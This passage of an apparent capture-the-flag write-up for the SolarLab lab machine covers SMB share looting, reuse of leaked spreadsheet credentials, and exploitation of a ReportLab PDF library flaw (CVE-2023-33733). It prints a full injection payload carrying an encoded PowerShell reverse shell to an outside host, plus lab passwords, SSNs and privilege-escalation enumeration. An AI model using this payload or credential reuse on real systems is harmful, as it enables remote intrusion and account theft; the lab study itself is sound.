<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ smbclient --no-pass  //10.10.11.16/Documents
</span></span><span style="display:flex;"><span>Try &#34;help&#34; to get a list of possible commands.
</span></span><span style="display:flex;"><span>smb: \&gt; dir
</span></span><span style="display:flex;"><span>  .                                  DR        0  Fri Apr 26 16:47:14 2024
</span></span><span style="display:flex;"><span>  ..                                 DR        0  Fri Apr 26 16:47:14 2024
</span></span><span style="display:flex;"><span>  concepts                            D        0  Fri Apr 26 16:41:57 2024
</span></span><span style="display:flex;"><span>  desktop.ini                       AHS      278  Fri Nov 17 10:54:43 2023
</span></span><span style="display:flex;"><span>  details-file.xlsx                   A    12793  Fri Nov 17 12:27:21 2023
</span></span><span style="display:flex;"><span>  My Music                        DHSrn        0  Thu Nov 16 19:36:51 2023
</span></span><span style="display:flex;"><span>  My Pictures                     DHSrn        0  Thu Nov 16 19:36:51 2023
</span></span><span style="display:flex;"><span>  My Videos                       DHSrn        0  Thu Nov 16 19:36:51 2023
</span></span><span style="display:flex;"><span>  old_leave_request_form.docx         A    37194  Fri Nov 17 10:35:57 2023
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		7779839 blocks of size 4096. 1885790 blocks available
</span></span><span style="display:flex;"><span>smb: \&gt; 
</span></span></code></pre></div><p>There are some document files stored in the share. Let&rsquo;s download them and analyze.</p>
<h2 id="exif-metadata-analysis">EXIF Metadata Analysis</h2>
<ul>
<li>
<p><strong>old_leave_request_form.docx</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ExifTool Version Number         : 12.76
</span></span><span style="display:flex;"><span>File Name                       : old_leave_request_form.docx
</span></span><span style="display:flex;"><span>Directory                       : .
</span></span><span style="display:flex;"><span>File Size                       : 37 kB
</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2024:05:14 17:16:22+02:00
</span></span><span style="display:flex;"><span>File Access Date/Time           : 2024:05:14 17:20:03+02:00
</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2024:05:14 17:16:22+02:00
</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex;"><span>File Type                       : DOCX
</span></span><span style="display:flex;"><span>File Type Extension             : docx
</span></span><span style="display:flex;"><span>MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
</span></span><span style="display:flex;"><span>Zip Required Version            : 20
</span></span><span style="display:flex;"><span>Zip Bit Flag                    : 0x0006
</span></span><span style="display:flex;"><span>Zip Compression                 : Deflated
</span></span><span style="display:flex;"><span>Zip Modify Date                 : 1980:01:01 00:00:00
</span></span><span style="display:flex;"><span>Zip CRC                         : 0x5c9ce90a
</span></span><span style="display:flex;"><span>Zip Compressed Size             : 483
</span></span><span style="display:flex;"><span>Zip Uncompressed Size           : 2460
</span></span><span style="display:flex;"><span>Zip File Name                   : [Content_Types].xml
</span></span><span style="display:flex;"><span>_NewReviewCycle                 : 
</span></span><span style="display:flex;"><span>Creator                         : Alison Melville
</span></span><span style="display:flex;"><span>Last Modified By                : Jackie
</span></span><span style="display:flex;"><span>Revision Number                 : 3
</span></span><span style="display:flex;"><span>Create Date                     : 2015:07:06 22:19:00Z
</span></span><span style="display:flex;"><span>Modify Date                     : 2015:08:03 16:50:00Z
</span></span><span style="display:flex;"><span>Template                        : Normal
</span></span><span style="display:flex;"><span>Total Edit Time                 : 1 minute
</span></span><span style="display:flex;"><span>Pages                           : 1
</span></span><span style="display:flex;"><span>Words                           : 142
</span></span><span style="display:flex;"><span>Characters                      : 814
</span></span><span style="display:flex;"><span>Application                     : Microsoft Office Word
</span></span><span style="display:flex;"><span>Doc Security                    : None
</span></span><span style="display:flex;"><span>Lines                           : 6
</span></span><span style="display:flex;"><span>Paragraphs                      : 1
</span></span><span style="display:flex;"><span>Scale Crop                      : No
</span></span><span style="display:flex;"><span>Heading Pairs                   : Title, 1
</span></span><span style="display:flex;"><span>Titles Of Parts                 : 
</span></span><span style="display:flex;"><span>Company                         : Greig Melville Associates Limited
</span></span><span style="display:flex;"><span>Links Up To Date                : No
</span></span><span style="display:flex;"><span>Characters With Spaces          : 955
</span></span><span style="display:flex;"><span>Shared Doc                      : No
</span></span><span style="display:flex;"><span>Hyperlinks Changed              : No
</span></span><span style="display:flex;"><span>App Version                     : 14.0000
</span></span></code></pre></div></li>
<li>
<p><strong>details-file.xlsx</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ExifTool Version Number         : 12.76
</span></span><span style="display:flex;"><span>File Name                       : details-file.xlsx
</span></span><span style="display:flex;"><span>Directory                       : .
</span></span><span style="display:flex;"><span>File Size                       : 13 kB
</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2024:05:14 17:16:11+02:00
</span></span><span style="display:flex;"><span>File Access Date/Time           : 2024:05:14 17:21:24+02:00
</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2024:05:14 17:16:11+02:00
</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex;"><span>File Type                       : XLSX
</span></span><span style="display:flex;"><span>File Type Extension             : xlsx
</span></span><span style="display:flex;"><span>MIME Type                       : application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
</span></span><span style="display:flex;"><span>Zip Required Version            : 20
</span></span><span style="display:flex;"><span>Zip Bit Flag                    : 0x0006
</span></span><span style="display:flex;"><span>Zip Compression                 : Deflated
</span></span><span style="display:flex;"><span>Zip Modify Date                 : 1980:01:01 00:00:00
</span></span><span style="display:flex;"><span>Zip CRC                         : 0xd125f54a
</span></span><span style="display:flex;"><span>Zip Compressed Size             : 388
</span></span><span style="display:flex;"><span>Zip Uncompressed Size           : 1681
</span></span><span style="display:flex;"><span>Zip File Name                   : [Content_Types].xml
</span></span><span style="display:flex;"><span>Creator                         : College of Education
</span></span><span style="display:flex;"><span>Last Modified By                : Paul Serban
</span></span><span style="display:flex;"><span>Create Date                     : 2011:03:24 14:38:51Z
</span></span><span style="display:flex;"><span>Modify Date                     : 2023:11:17 12:27:21Z
</span></span><span style="display:flex;"><span>Application                     : Microsoft Excel
</span></span><span style="display:flex;"><span>Doc Security                    : None
</span></span><span style="display:flex;"><span>Scale Crop                      : No
</span></span><span style="display:flex;"><span>Heading Pairs                   : Worksheets, 3
</span></span><span style="display:flex;"><span>Titles Of Parts                 : Sheet1, Sheet2, Sheet3
</span></span><span style="display:flex;"><span>Company                         : Purdue University
</span></span><span style="display:flex;"><span>Links Up To Date                : No
</span></span><span style="display:flex;"><span>Shared Doc                      : No
</span></span><span style="display:flex;"><span>Hyperlinks Changed              : No
</span></span><span style="display:flex;"><span>App Version                     : 16.0300
</span></span><span style="display:flex;"><span>MSIP_Label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_Enabled: true
</span></span><span style="display:flex;"><span>MSIP_Label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_SetDate: 2023-11-17T10:41:19Z
</span></span><span style="display:flex;"><span>MSIP_Label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_Method: Standard
</span></span><span style="display:flex;"><span>MSIP_Label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_Name: All Employees_2
</span></span><span style="display:flex;"><span>MSIP_Label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_SiteId: 33440fc6-b7c7-412c-bb73-0e70b0198d5a
</span></span><span style="display:flex;"><span>MSIP_Label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_ActionId: c1afab2c-84d2-450d-9066-dcc727984137
</span></span><span style="display:flex;"><span>MSIP_Label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_ContentBits: 0
</span></span></code></pre></div><p>This file contains MIP Metadata which are part of <code>Microsoft Information Protection SDK - Metadata</code>. So it might contain some juicy informations.</p>
</li>
<li>
<p><strong>Training-Request-Form.docx</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ExifTool Version Number         : 12.76
</span></span><span style="display:flex;"><span>File Name                       : Training-Request-Form.docx
</span></span><span style="display:flex;"><span>Directory                       : .
</span></span><span style="display:flex;"><span>File Size                       : 161 kB
</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2024:05:14 17:16:49+02:00
</span></span><span style="display:flex;"><span>File Access Date/Time           : 2024:05:14 17:20:39+02:00
</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2024:05:14 17:16:49+02:00
</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex;"><span>File Type                       : DOCX
</span></span><span style="display:flex;"><span>File Type Extension             : docx
</span></span><span style="display:flex;"><span>MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
</span></span><span style="display:flex;"><span>Zip Required Version            : 20
</span></span><span style="display:flex;"><span>Zip Bit Flag                    : 0x0006
</span></span><span style="display:flex;"><span>Zip Compression                 : Deflated
</span></span><span style="display:flex;"><span>Zip Modify Date                 : 1980:01:01 00:00:00
</span></span><span style="display:flex;"><span>Zip CRC                         : 0xd2250c4f
</span></span><span style="display:flex;"><span>Zip Compressed Size             : 470
</span></span><span style="display:flex;"><span>Zip Uncompressed Size           : 2223
</span></span><span style="display:flex;"><span>Zip File Name                   : [Content_Types].xml
</span></span><span style="display:flex;"><span>Creator                         : Gayle.Rennie
</span></span><span style="display:flex;"><span>Last Modified By                : FRYATT, Susanne (WGPSN)
</span></span><span style="display:flex;"><span>Revision Number                 : 2
</span></span><span style="display:flex;"><span>Create Date                     : 2018:07:20 08:11:00Z
</span></span><span style="display:flex;"><span>Modify Date                     : 2018:07:20 08:11:00Z
</span></span><span style="display:flex;"><span>Template                        : Normal.dotm
</span></span><span style="display:flex;"><span>Total Edit Time                 : 44 minutes
</span></span><span style="display:flex;"><span>Pages                           : 1
</span></span><span style="display:flex;"><span>Words                           : 188
</span></span><span style="display:flex;"><span>Characters                      : 1078
</span></span><span style="display:flex;"><span>Application                     : Microsoft Office Word
</span></span><span style="display:flex;"><span>Doc Security                    : None
</span></span><span style="display:flex;"><span>Lines                           : 8
</span></span><span style="display:flex;"><span>Paragraphs                      : 2
</span></span><span style="display:flex;"><span>Scale Crop                      : No
</span></span><span style="display:flex;"><span>Heading Pairs                   : Title, 1
</span></span><span style="display:flex;"><span>Titles Of Parts                 : 
</span></span><span style="display:flex;"><span>Company                         : Wood Group
</span></span><span style="display:flex;"><span>Links Up To Date                : No
</span></span><span style="display:flex;"><span>Characters With Spaces          : 1264
</span></span><span style="display:flex;"><span>Shared Doc                      : No
</span></span><span style="display:flex;"><span>Hyperlinks Changed              : No
</span></span><span style="display:flex;"><span>App Version                     : 14.0000
</span></span></code></pre></div></li>
<li>
<p><strong>Travel-Request-Sample.docx</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ExifTool Version Number         : 12.76
</span></span><span style="display:flex;"><span>File Name                       : Travel-Request-Sample.docx
</span></span><span style="display:flex;"><span>Directory                       : .
</span></span><span style="display:flex;"><span>File Size                       : 31 kB
</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2024:05:14 17:16:55+02:00
</span></span><span style="display:flex;"><span>File Access Date/Time           : 2024:05:14 17:21:02+02:00
</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2024:05:14 17:16:55+02:00
</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex;"><span>File Type                       : DOCX
</span></span><span style="display:flex;"><span>File Type Extension             : docx
</span></span><span style="display:flex;"><span>MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
</span></span><span style="display:flex;"><span>Zip Required Version            : 20
</span></span><span style="display:flex;"><span>Zip Bit Flag                    : 0x0006
</span></span><span style="display:flex;"><span>Zip Compression                 : Deflated
</span></span><span style="display:flex;"><span>Zip Modify Date                 : 1980:01:01 00:00:00
</span></span><span style="display:flex;"><span>Zip CRC                         : 0x7d32bdda
</span></span><span style="display:flex;"><span>Zip Compressed Size             : 440
</span></span><span style="display:flex;"><span>Zip Uncompressed Size           : 1997
</span></span><span style="display:flex;"><span>Zip File Name                   : [Content_Types].xml
</span></span><span style="display:flex;"><span>Title                           : 
</span></span><span style="display:flex;"><span>Subject                         : 
</span></span><span style="display:flex;"><span>Creator                         : Paul Squillace
</span></span><span style="display:flex;"><span>Keywords                        : 
</span></span><span style="display:flex;"><span>Description                     : 
</span></span><span style="display:flex;"><span>Last Modified By                : Katy Brown
</span></span><span style="display:flex;"><span>Revision Number                 : 2
</span></span><span style="display:flex;"><span>Create Date                     : 2015:06:14 14:49:00Z
</span></span><span style="display:flex;"><span>Modify Date                     : 2015:06:14 14:49:00Z
</span></span><span style="display:flex;"><span>Template                        : Normal.dotm
</span></span><span style="display:flex;"><span>Total Edit Time                 : 1 minute
</span></span><span style="display:flex;"><span>Pages                           : 1
</span></span><span style="display:flex;"><span>Words                           : 351
</span></span><span style="display:flex;"><span>Characters                      : 2003
</span></span><span style="display:flex;"><span>Application                     : Microsoft Macintosh Word
</span></span><span style="display:flex;"><span>Doc Security                    : Read-only enforced
</span></span><span style="display:flex;"><span>Lines                           : 16
</span></span><span style="display:flex;"><span>Paragraphs                      : 4
</span></span><span style="display:flex;"><span>Scale Crop                      : No
</span></span><span style="display:flex;"><span>Heading Pairs                   : Title, 1
</span></span><span style="display:flex;"><span>Titles Of Parts                 : 
</span></span><span style="display:flex;"><span>Company                         : Microsoft
</span></span><span style="display:flex;"><span>Links Up To Date                : No
</span></span><span style="display:flex;"><span>Characters With Spaces          : 2350
</span></span><span style="display:flex;"><span>Shared Doc                      : No
</span></span><span style="display:flex;"><span>Hyperlinks Changed              : No
</span></span><span style="display:flex;"><span>App Version                     : 14.0000
</span></span></code></pre></div></li>
</ul>
<h2 id="credentials">Credentials</h2>
<p>The <strong>details-file.xlsx</strong> contained sensitive information.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Password File							
</span></span><span style="display:flex;"><span>                            
</span></span><span style="display:flex;"><span>Alexander&#39;s SSN		123-23-5424					
</span></span><span style="display:flex;"><span>Claudia&#39;s SSN		820-378-3984					
</span></span><span style="display:flex;"><span>Blake&#39;s SSN		739-1846-436
</span></span></code></pre></div><table>
<thead>
<tr>
<th>Site</th>
<th>Account#</th>
<th>Username</th>
<th>Password</th>
<th>Security Question</th>
<th>Answer</th>
<th>Email</th>
<th>Other information</th>
</tr>
</thead>
<tbody>
<tr>
<td>Amazon.com</td>
<td>101-333</td>
<td><a href="mailto:Alexander.knight@gmail.com">Alexander.knight@gmail.com</a></td>
<td>al;ksdhfewoiuh</td>
<td>What was your mother&rsquo;s maiden name?</td>
<td>Blue</td>
<td><a href="mailto:Alexander.knight@gmail.com">Alexander.knight@gmail.com</a></td>
<td></td>
</tr>
<tr>
<td>Pefcu</td>
<td>A233J</td>
<td>KAlexander</td>
<td>dkjafblkjadsfgl</td>
<td>What was your high school mascot</td>
<td>Pine Tree</td>
<td><a href="mailto:Alexander.knight@gmail.com">Alexander.knight@gmail.com</a></td>
<td></td>
</tr>
<tr>
<td>Chase</td>
<td></td>
<td><a href="mailto:Alexander.knight@gmail.com">Alexander.knight@gmail.com</a></td>
<td>d398sadsknr390</td>
<td>What was the name of your first pet?</td>
<td>corvette</td>
<td><a href="mailto:Claudia.springer@gmail.com">Claudia.springer@gmail.com</a></td>
<td></td>
</tr>
<tr>
<td>Fidelity</td>
<td></td>
<td>blake.byte</td>
<td>ThisCanB3typedeasily1@</td>
<td>What was your mother&rsquo;s maiden name?</td>
<td>Helena	blake@purdue.edu</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Signa</td>
<td></td>
<td>AlexanderK</td>
<td>danenacia9234n</td>
<td>What was your mother&rsquo;s maiden name?</td>
<td>Poppyseed muffins</td>
<td><a href="mailto:Alexander.knight@gmail.com">Alexander.knight@gmail.com</a></td>
<td>account number: 1925-47218-30</td>
</tr>
<tr>
<td></td>
<td></td>
<td>ClaudiaS</td>
<td>dadsfawe9dafkn</td>
<td>What was your mother&rsquo;s maiden name?</td>
<td>yellow crayon</td>
<td><a href="mailto:Claudia.springer@gmail.com">Claudia.springer@gmail.com</a></td>
<td>account number: 3872-03498-45</td>
</tr>
<tr>
<td>Comcast</td>
<td>JHG3434</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Vectren</td>
<td>YUIO576</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Verizon</td>
<td>1111-5555-33</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>With the above credentials I tried to login to the <code>report.solarlab.htb:6791</code> and found a match. Apparently, the username structure for this organization is <code>Firstname + Lastname Initial</code>.</p>
<p>The matched credential is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>**********:ThisCanB3typedeasily1@
</span></span></code></pre></div><h2 id="enumerating-the-report-portal-dashboard">Enumerating The Report Portal Dashboard</h2>
<p><img src="images/report_dashboard.png" alt="Report Portal Dashboard"></p>
<p>It was a portal for sending/approving leave request/vacation approval etc. After filling the form and <strong>uploading a image</strong> for attaching signature, Ait generated a pdf file.</p>
<p><img src="images/generated_pdf.png" alt="Generated PDF"></p>
<p>Examining the generated pdf file with exiftool I discovered it was using <code>ReportLab PDF Library</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ExifTool Version Number         : 12.76
</span></span><span style="display:flex;"><span>File Name                       : output.pdf
</span></span><span style="display:flex;"><span>Directory                       : .
</span></span><span style="display:flex;"><span>File Size                       : 277 kB
</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2024:05:14 19:24:09+02:00
</span></span><span style="display:flex;"><span>File Access Date/Time           : 2024:05:14 19:24:09+02:00
</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2024:05:14 19:24:09+02:00
</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex;"><span>File Type                       : PDF
</span></span><span style="display:flex;"><span>File Type Extension             : pdf
</span></span><span style="display:flex;"><span>MIME Type                       : application/pdf
</span></span><span style="display:flex;"><span>PDF Version                     : 1.4
</span></span><span style="display:flex;"><span>Linearized                      : No
</span></span><span style="display:flex;"><span>Author                          : (anonymous)
</span></span><span style="display:flex;"><span>Create Date                     : 2024:05:14 20:18:13-02:00
</span></span><span style="display:flex;"><span>Creator                         : (unspecified)
</span></span><span style="display:flex;"><span>Modify Date                     : 2024:05:14 20:18:13-02:00
</span></span><span style="display:flex;"><span>Producer                        : ReportLab PDF Library - www.reportlab.com
</span></span><span style="display:flex;"><span>Subject                         : (unspecified)
</span></span><span style="display:flex;"><span>Title                           : (anonymous)
</span></span><span style="display:flex;"><span>Trapped                         : False
</span></span><span style="display:flex;"><span>Page Mode                       : UseNone
</span></span><span style="display:flex;"><span>Page Count                      : 1
</span></span></code></pre></div><p>A quick search for this library resulted in that this library maybe (because I couldn&rsquo;t determine the version of the library) vulnerable to an RCE. Read more about it on <a href="https://www.bleepingcomputer.com/news/security/exploit-released-for-rce-flaw-in-popular-reportlab-pdf-library/">BleepingComputer</a>.</p>
<p>A publicly available PoC was released on <a href="https://github.com/c53elyas/CVE-2023-33733">Github</a>.</p>
<p>The vulnerability was due to how it handled converting HTML to PDF (the flaw in xhtml2pdf).</p>
<p><strong>PoC:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;para&gt;
</span></span><span style="display:flex;"><span>    &lt;font
</span></span><span style="display:flex;"><span>        color=&#34;[ [ getattr(pow,Word(&#39;__globals__&#39;))[&#39;os&#39;].system(&#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANAA2ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&#39;) for Word in [orgTypeFun(&#39;Word&#39;, (str,), { &#39;mutated&#39;: 1, &#39;startswith&#39;: lambda self, x: False, &#39;__eq__&#39;: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#39;mutate&#39;: lambda self: {setattr(self, &#39;mutated&#39;, self.mutated - 1)}, &#39;__hash__&#39;: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and &#39;red&#39;&#34;&gt;
</span></span><span style="display:flex;"><span>        exploit
</span></span><span style="display:flex;"><span>    &lt;/font&gt;
</span></span><span style="display:flex;"><span>&lt;/para&gt;
</span></span></code></pre></div><p><strong>Delivery:</strong></p>
<p>The <code>justification</code> field is limited by 300 characters so it cannot be used also we cannot attach html file. And the date section is accepts date range. So that leaves <code>ome_office_request</code> parameter to deliver the payload.</p>
<h2 id="foothold">Foothold</h2>
<p>We got a shell as blake and our user flag.</p>
<h2 id="privesc-enumeration">PrivEsc Enumeration</h2>
<p>I found a sqlite database inside the <code>app/instance</code> directory.</p>
<ul>
<li>
<p><strong>users.db</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>1	blakeb	ThisCanB3typedeasily1@
</span></span><span style="display:flex;"><span>2	claudias	007poiuytrewq
</span></span><span style="display:flex;"><span>3	alexanderk	HotP!fireguard
</span></span></code></pre></div></li>
<li>
<p><strong>Current User Info</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>USER INFORMATION
</span></span><span style="display:flex;"><span>----------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User Name      SID                                           
</span></span><span style="display:flex;"><span>============== ==============================================
</span></span><span style="display:flex;"><span>solarlab\blake S-1-5-21-3606151065-2641007806-2768514320-1000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>GROUP INFORMATION
</span></span><span style="display:flex;"><span>-----------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Group Name                             Type             SID          Attributes                                        
</span></span><span style="display:flex;"><span>====================================== ================ ============ ==================================================
</span></span><span style="display:flex;"><span>Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>NT AUTHORITY\BATCH                     Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
</span></span><span style="display:flex;"><span>----------------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Privilege Name                Description                          State   
</span></span><span style="display:flex;"><span>============================= ==================================== ========
</span></span><span style="display:flex;"><span>SeShutdownPrivilege           Shut down the system                 Disabled
</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
</span></span><span style="display:flex;"><span>SeUndockPrivilege             Remove computer from docking station Disabled
</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
</span></span><span style="display:flex;"><span>SeTimeZonePrivilege           Change the time zone                 Disable
</span></span></code></pre></div></li>
<li>
<p><strong>Active Connections - Listening</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4960
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       896
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       6008
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:6791           0.0.0.0:0              LISTENING       4960
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       660
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       528
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       728
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1564
</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       652
</span></span><span style="display:flex;"><span>  TCP    10.10.11.16:139        0.0.0.0:0              LISTENING       4
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:5000         0.0.0.0:0              LISTENING       852
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:5222         0.0.0.0:0              LISTENING       2996
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:5223         0.0.0.0:0              LISTENING       2996
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:5262         0.0.0.0:0              LISTENING       2996
